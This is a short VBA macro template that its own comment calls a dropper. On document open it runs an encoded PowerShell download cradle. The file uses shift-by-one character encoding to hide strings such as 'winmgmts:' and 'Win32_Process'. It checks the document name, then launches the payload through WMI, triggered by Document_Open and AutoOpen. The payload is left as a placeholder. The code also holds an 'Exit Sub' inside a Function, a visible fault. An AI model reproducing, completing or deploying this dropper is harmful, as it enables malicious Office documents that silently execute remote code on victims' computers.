' Simple VBA dropper that executes and encoded powershell download craddle
Function Cooker(ingredients As Variant) As String
   Dim to_bake As String
   to_bake = ""

   Dim i As Integer
   For i = LBound(ingredients) To UBound(ingredients)
      to_bake = to_bake & Chr(ingredients(i) - 1)
   Next i
   
   Cooker = to_bake
End Function


Function Run()

   ' my_file.doc
   If ActiveDocument.Name <> Cooker(Array(110,122,96,103,106,109,102,47,101,112,100)) Then
      Exit Sub
   End If

   Dim to_bake As String
   Dim ingredients As Variant
   Dim oven As String
   Dim plate As String
      
   ingredients = Array(ARRAY_HERE)
   
   to_bake = Cooker(ingredients)
   
   ingredients = Array(120, 106, 111, 110, 104, 110, 117, 116, 59) 'winmgmts:
   oven = Cooker(ingredients)
   ingredients = Array(88, 106, 111, 52, 51, 96, 81, 115, 112, 100, 102, 116, 116) 'Win32_Process
   plate = Cooker(ingredients)
   
   GetObject(oven).Get(plate).Create to_bake, Null, Null, pid
End Function


Sub Document_Open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub